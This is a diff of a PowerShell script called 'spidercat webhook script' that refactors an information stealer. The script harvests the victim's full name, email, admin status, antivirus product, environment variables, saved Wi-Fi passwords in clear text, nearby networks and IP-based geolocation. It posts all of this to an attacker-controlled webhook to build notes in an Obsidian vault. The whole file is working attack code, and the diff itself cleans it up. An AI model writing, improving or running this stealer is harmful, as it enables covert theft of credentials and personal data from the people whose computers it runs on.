@@ -1,84 +1,64 @@
 # spidercat webhook script
 # created by : C0SM0
 
-# change me
+# Change this to your actual webhook URL
 $webhook = "WEBHOOK HERE"
 
-# variables
+# Variables
 $account = $env:userprofile.Split('\')[2]
 $username = $env:username
 $markdown = "$account.md"
 
-# network values
-# possible replacement for using curl.exe (better OPSEC)
-# $public = Resolve-DnsName -Server ns1.google.com -Type TXT -Name o-o.myaddr.l.google.com | Select-Object -ExpandProperty 'Strings'
-$public = curl.exe https://ident.me
-$private = (get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}).ipaddress[0]
-$MAC = ipconfig /all | Select-String -Pattern "physical" | select-object -First 1; $MAC = [string]$MAC; $MAC = $MAC.Substring($MAC.Length - 17)
+# Functions
 
-# send content to obsidian
-function send_to_obsidian {
-
-    # file parameter
-    [CmdletBinding()]
+# Send content to Obsidian
+function Send-ToObsidian {
     param (
-    [Parameter (Position=0,Mandatory = $True)]
-    [string]$message,
-    [Parameter (Position=1,Mandatory = $True)]
-    [string]$file
+        [Parameter(Mandatory = $true)]
+        [string]$Message,
+        [Parameter(Mandatory = $true)]
+        [string]$File
     )
 
-    # curl requests
-    curl.exe -d "$message" -H "Content-Type: text/plain" "$webhook`?path=$file"
+    # Use Invoke-WebRequest for HTTP requests
+    Invoke-WebRequest -Uri "$webhook`?path=$file" -Method Post -Body $Message -ContentType "text/plain"
 }
 
-function Get-fullName {
-
+# Get full name of the user
+function Get-FullName {
     try {
-
-    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
-
+        $fullName = (Net User $Env:username | Select-String -Pattern "Full Name").Line.Split(':')[1].Trim()
     }
-
-    # Write Error is just for troubleshooting
-    catch {Write-Error "No name was detected"
-    return "NA"
-    -ErrorAction SilentlyContinue
+    catch {
+        Write-Error "No name was detected"
+        $fullName = "NA"
     }
-
     return $fullName
 }
 
-function Get-email {
-
+# Get email of the user
+function Get-Email {
     try {
-
-    $email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
-	return $email
+        $email = (GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})").Matches.Value
     }
-
-    # Write Error is just for troubleshooting
     catch {
         Write-Error "An email was not found"
-        return "No Email Detected"
+        $email = "No Email Detected"
     }
+    return $email
 }
 
-function Get-IP-Information {
-    $ipinfo = curl.exe "https://ipinfo.io" | ConvertFrom-Json
-
+# Get IP information
+function Get-IPInformation {
+    $ipinfo = Invoke-RestMethod -Uri "https://ipinfo.io"
     return $ipinfo
 }
 
+# Get Antivirus solution
 function Get-AntivirusSolution {
     try {
         $Antivirus = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct -ErrorAction Stop
-        if ($Antivirus) {
-            $AntivirusSolution = $Antivirus.displayName
-        }
-        else {
-            $AntivirusSolution = "NA"
-        }
+        $AntivirusSolution = $Antivirus.displayName
     }
     catch {
         Write-Error "Unable to get Antivirus Solution: $_"
@@ -98,9 +78,9 @@ function Get-EnvironmentVariables {
     return $envVars
 }
 
-# markdown wireless information
-function wireless_markdown {
-    # get wireless creds
+# Generate markdown for wireless information
+function Generate-WirelessMarkdown {
+    # Get wireless credentials
     $SSIDS = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+"
     $wifi_info = foreach($SSID in $SSIDS) {
         $Password = (netsh wlan show profiles name=$SSID key=clear | Select-String 'Key Content') -replace ".*:\s+"
@@ -108,38 +88,30 @@ function wireless_markdown {
     }
     $wifi_json = $wifi_info | ConvertTo-Json | ConvertFrom-Json
 
-    for ($i = 0; $i -le $wifi_json.Length; $i++) {
-        $wifi_name = $wifi_json.SSID[$i]
-        $wifi_pass = $wifi_json.Password[$i]
-
+    foreach ($wifi in $wifi_json) {
         $content = @"
-# $wifi_name
-- SSID : $wifi_name
-- Password : $wifi_pass
+# $($wifi.SSID)
+- SSID : $($wifi.SSID)
+- Password : $($wifi.Password)
 
 ## Tags
 #wifi
 "@
-        send_to_obsidian -message $content -file "$wifi_name.md"
+        Send-ToObsidian -Message $content -File "$($wifi.SSID).md"
     }
     return $wifi_json
 }
 
-# mark user information
-function user_markdown {
-
-    # general values
-    $full_name = Get-fullName
-    $email = Get-email
+# Generate markdown for user information
+function Generate-UserMarkdown {
+    # General values
+    $full_name = Get-FullName
+    $email = Get-Email
     $is_admin = (Get-LocalGroupMember 'Administrators').Name -contains "$env:COMPUTERNAME\$env:USERNAME"
     $antivirus = Get-AntivirusSolution
     $envVars = Get-EnvironmentVariables
 
-foreach ($envVar in $envVars) {
-        $content += "- $($envVar.Name) : $($envVar.Value)`n"
-    }
-
-    # create markdown content
+    # Create markdown content
     $content = @"
 # $account
 
@@ -152,59 +124,49 @@ foreach ($envVar in $envVars) {
 - UserProfile : $account
 - Admin : $is_admin
 
-## Wireless
-- Public : $public
-- Private : $private
-- MAC : $MAC
-
 ## PC Information
 - Antivirus : $antivirus
 
+## Environment Variables
+"@
 
-    send_to_obsidian -message $content -file $markdown
-
-    # get saved wireless data
-    $wifi_json = wireless_markdown
-
-    # add known connections
-    for ($i = 0; $i -le $wifi_json.Length; $i++) {
-        $wifi_name = $wifi_json.SSID[$i]
-
-        send_to_obsidian -message "- [[$wifi_name]]" -file $markdown
+    foreach ($envVar in $envVars) {
+        $content += "- $($envVar.Name) : $($envVar.Value)`n"
     }
 
-    # setup nearby networks
-    send_to_obsidian -message "`n## Nearby Networks" -file $markdown
+    Send-ToObsidian -Message $content -File $markdown
 
-    # attempt to read nearby networks
+    # Get saved wireless data
+    $wifi_json = Generate-WirelessMarkdown
+
+    # Add known connections
+    foreach ($wifi in $wifi_json) {
+        Send-ToObsidian -Message "- [[$($wifi.SSID)]]" -File $markdown
+    }
+
+    # Setup nearby networks
+    Send-ToObsidian -Message "`n## Nearby Networks" -File $markdown
+
+    # Attempt to read nearby networks
     try {
-        # get nearby ssids
-        $nearby_ssids = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()
+        # Get nearby SSIDs
+        $nearby_ssids = (netsh wlan show networks mode=Bssid | Where-Object { $_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*" }).Trim()
 
-        # clean for iteration
-        $nearby_networks = $nearby_ssids | ConvertTo-Json | ConvertFrom-Json
-
-        # format and add ssids
-        for ($i = 0; $i -le $nearby_networks.Length; $i++) {
-
-            if ($nearby_networks[$i] -like "SSID*") {
-                $formatted_ssid = $nearby_networks[$i] | Out-String
-                $formatted_ssid = $formatted_ssid.Split(":")[1] | Out-String
-                $formatted_ssid = $formatted_ssid.Replace(" ", "").Replace("`n","")
-
-                send_to_obsidian -message "- #$formatted_ssid" -file $markdown
+        # Format and add SSIDs
+        foreach ($ssid in $nearby_ssids) {
+            if ($ssid -like "SSID*") {
+                $formatted_ssid = $ssid.Split(":")[1].Trim().Replace(" ", "")
+                Send-ToObsidian -Message "- #$formatted_ssid" -File $markdown
             }
         }
     }
-
-    # exception
     catch {
-        send_to_obsidian -message "- No nearby wifi networks detected" -file $markdown
+        Send-ToObsidian -Message "- No nearby wifi networks detected" -File $markdown
     }
 
-    # ip information
-    $ip_information = Get-IP-Information
-    send_to_obsidian -message "`n## IP Information:$($ip_information | Out-String )" -file $markdown
+    # IP information
+    $ip_information = Get-IPInformation
+    Send-ToObsidian -Message "`n## IP Information:$($ip_information | Out-String)" -File $markdown
     $latitude, $longitude = $ip_information.loc.Split(',')
     $city = $ip_information.city.replace(' ', '-')
     $region = $ip_information.region.replace(' ', '-')
@@ -213,7 +175,7 @@ foreach ($envVar in $envVars) {
     $zipcode = $ip_information.postal
     $timezone = $ip_information.timezone.replace(' ', '-')
 
-    # write ip info and geolocation
+    # Write IP info and geolocation
     $content = @"
 ## Geolocation
 <div class="mapouter"><div class="gmap_canvas"><iframe width="600" height="500" id="gmap_canvas" src="https://maps.google.com/maps?q=$latitude,$longitude&t=k&z=13&ie=UTF8&iwloc=&output=embed" frameborder="0" scrolling="no" marginheight="0" marginwidth="0"></iframe><br><style>.mapouter{position:relative;text-align:right;height:500px;width:600px;}</style><style>.gmap_canvas {overflow:hidden;background:none!important;height:500px;width:600px;}</style></div></div>
@@ -221,9 +183,9 @@ foreach ($envVar in $envVars) {
 ## Tags
 #user #$city #$region #$country #$organization #zip-$zipcode #$timezone
 "@
-    # send data set two
-    send_to_obsidian -message $content -file $markdown
-
+    # Send data set two
+    Send-ToObsidian -Message $content -File $markdown
 }
 
-user_markdown
+# Main execution block
+Generate-UserMarkdown
